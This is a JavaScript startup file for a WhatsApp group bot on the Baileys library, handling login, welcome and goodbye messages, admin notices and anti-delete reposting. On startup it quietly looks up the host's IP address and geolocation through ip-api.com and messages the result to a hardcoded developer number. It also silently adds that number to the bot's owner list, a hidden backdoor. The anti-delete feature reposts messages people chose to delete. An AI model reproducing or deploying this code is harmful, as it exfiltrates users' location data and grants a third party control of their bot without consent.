const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const denz = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Kolkata').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [3,3234,9]
    denz.logger.level = 'warn'
    await sleep(10000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan this QR code', 'green'))
    })
    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
    
    denz.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'red'))
        })
     
      await denz.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `Hi`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 ${settings.NamaBot}, 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 H U S N I ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("917025868709@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Husni ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })
      
    denz.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'white'))
		})
	
	denz.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'orange'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'green'))
        })
    
    denz.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'red'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   denz.on('chat-update', async (mek) => {
        require('./denz.js')(denz, mek)
        ownerNumber = ["917025868709@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        denz.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
           const uwu = '```'
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await denz.prepareMessage(mdata.id, kma, MessageType.location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
			const mdata = await denz.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Husni ser;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:𝚒𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`𝙷𝚎𝚕𝚕𝚘? @${num.split('@')[0]}
𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 ${mdata.subject}

𝙴𝚗𝚓𝚘𝚢 𝙳𝚘𝚗𝚝 𝙵𝚘𝚛𝚐𝚘𝚝 𝚃𝚘 𝙲𝚘𝚗𝚝𝚊𝚌𝚝
Click the button below to start the bot
Note if there is no type .allmenu`
gbutsan = [
{buttonId:`inibuatwelcome`,buttonText:{displayText:'Welcome'},type:1},
{buttonId:`menu`,buttonText:{displayText:'MENU'},type:1},
{buttonId:`owner`,buttonText:{displayText:'OWNER'},type:1}
]
mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `${masuk}`,
footerText: `ꪶ𝑯𝑼𝑺𝑵𝑰⇥𝑺𝑬𝑹ꫂ⁩`, 
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        "contextInfo": {
            mentionedJid: [num]},
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${masuk}`, `${uwu}𝑯 𝑼 𝑺 𝑵 𝑰右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
			} else if (anu.action == 'remove') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Husni ser;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`𝙶𝚘𝚘𝚍𝚋𝚢𝚎 𝙱𝚛𝚘 @${num.split('@')[0]}\n𝙷𝚘𝚙𝚎𝚏𝚞𝚕𝚕𝚢 𝙰𝚋𝚘𝚞𝚝 𝚝𝚑𝚎𝚛𝚎`
gbutsan = [
{buttonId:`inibuatout`,buttonText:{displayText:'👋Byee'},type:1}
]
mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: `${keluar}`,
footerText: `𝚆𝙷𝙰𝚃𝚜𝙷𝚄𝚂𝙽𝙸©™`,
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        "contextInfo": {
            mentionedJid: [num]},
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${keluar}`, `${uwu}𝑯 𝑼 𝑺 𝑵 𝑰 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Husni ser;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*𝙿 𝚁 𝙾 𝙼 𝙾 𝚃 𝙴 - 𝙳 𝙴 𝚃 𝙴 𝙲 𝚃 𝙴 𝙳*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Husni ser;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:𝙸𝚗𝚍𝚊𝚒\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*𝙳 𝙴 𝙼 𝙾 𝚃 𝙴 - 𝙳 𝙴 𝚃 𝙴 𝙲 𝚃 𝙴 𝙳*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	denz.on('group-update', async (anu) => {
		const metdata = await denz.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Husni ser;;;\nFN:Denz\nitem1.TEL;waid=917025868709:917025868709\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ 𝙶𝚁𝙾𝚄𝙿 - 𝙾𝙿𝙴𝙽𝙴𝙳 ] -\n\n_𝙶𝚁𝙾𝚄𝙿 𝙾𝙿𝙴𝙽𝙳 𝙱𝚈 𝙰𝙳𝙼𝙸𝙽_\n_𝙽𝙾𝚆 𝙰𝙻𝙻 𝙼𝙴𝙼𝙱𝙴𝚁𝚂 𝙲𝙰𝙽 𝙼𝙰𝚂𝚂𝙰𝙶𝙴_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ 𝙶𝚁𝙾𝚄𝙿 - 𝙲𝙻𝙾𝚂𝙴𝙳 ] -\n\n_𝙶𝚁𝙾𝚄𝙿 𝙲𝙻𝙾𝚂𝙴𝙳 𝙱𝚈 𝙰𝙳𝙼𝙸𝙽_\n_𝙼𝙰𝚂𝚂𝙰𝙶𝙴 𝙰𝙵𝚃𝙴𝚁 𝙶𝚁𝙾𝚄𝙿 𝙾𝙿𝙴𝙽𝙸𝙽𝙶 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿_`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ 𝙶𝚁𝙾𝚄𝙿 𝙳𝙸𝚂𝙿𝚁𝙸𝙿𝚃𝙸𝙾𝙽 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 ] -\n\n𝙶𝚁𝙾𝚄𝙿 𝙳𝙸𝚂𝙲𝚁𝙸𝙿𝚃𝙸𝙾𝙽 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 𝙱𝚈 𝙰𝙳𝙼𝙸𝙽 @${anu.descOwner.split('@')[0]}\n• 𝙽𝙴𝚆 𝙳𝙸𝚂𝙲𝚁𝙸𝙿𝚃𝙸𝙾𝙽 : ${anu.desc}`
    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`𝙶𝚁𝙾𝚄𝙿 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝚃𝙸𝙾𝙽 𝙲𝙷𝙰𝙽𝙶𝙴 𝙸𝙽 ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ 𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 ] -\n\n𝙴𝙳𝙸𝚃 𝙶𝚁𝙾𝚄𝙿 𝙸𝙽𝙵𝙾 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙾𝙿𝙴𝙽𝙴𝙳 𝙵𝙾𝚁 𝙼𝙴𝙼𝙱𝙴𝚁𝚂\n𝙽𝙾𝚆 𝙰𝙻𝙻 𝙼𝙴𝙼𝙱𝙴𝚁𝚂 𝙲𝙰𝙽 𝙴𝙳𝙸𝚃 𝚃𝙷𝙸𝚂 𝙶𝚁𝙾𝚄𝙿 𝙸𝙽𝙵𝙾`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴 𝙸𝙽 ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ 𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴𝙳 ] -\n\n𝙴𝙳𝙸𝚃 𝙶𝚁𝙾𝚄𝙿 𝙸𝙽𝙵𝙾 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙲𝙻𝙾𝚂𝙴𝙳 𝙵𝙾𝚁 𝙼𝙴𝙼𝙱𝙴𝚁𝚂\n𝙽𝙾𝚆 𝙾𝙽𝙻𝚈 𝙰𝙳𝙼𝙸𝙽 𝙲𝙰𝙽 𝙴𝙳𝙸𝚃 𝚃𝙷𝙸𝚂 𝙶𝚁𝙾𝚄𝙿 𝙸𝙽𝙵𝙾`
    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙲𝙷𝙰𝙽𝙶𝙴 𝙸𝙽 ${metdata.subject}`,  'cyan'))
  }
})


        
	denz.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Kolkata').format('HH:mm:ss')
let d = new Date
let c = denz.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = denz.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['𝙼𝚘𝚗𝚍𝚊𝚢', '𝚃𝚞𝚎𝚜𝚍𝚊𝚢','𝚆𝚎𝚗𝚍𝚎𝚜𝚍𝚊𝚢','𝚃𝚑𝚞𝚛𝚜𝚍𝚊𝚢','𝙵𝚛𝚒𝚍𝚊𝚢'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
denz.copyNForward(m.key.remoteJid, m.message)
denz.sendMessage(m.key.remoteJid, `▷\`\`\`𝙰𝙽𝚃𝙸 𝙳𝙴𝙻𝙴𝚃𝙴\`\`\`

➬ \`\`\`𝙽𝙰𝙼𝙴 : @${m.participant.split("@")[0]}\`\`\`
➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚄𝙱𝙻𝙸𝙲 - 𝙱𝙾𝚃 𝙱𝚈 - ꪶ𝑯𝑼𝑺𝑵𝑰⇥𝑺𝑬𝑹ꫂ⁩⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('maalutty  ser bot v4', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: true
	    }), 'white')), term.slowTyping(' Created By Spyro ser' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()
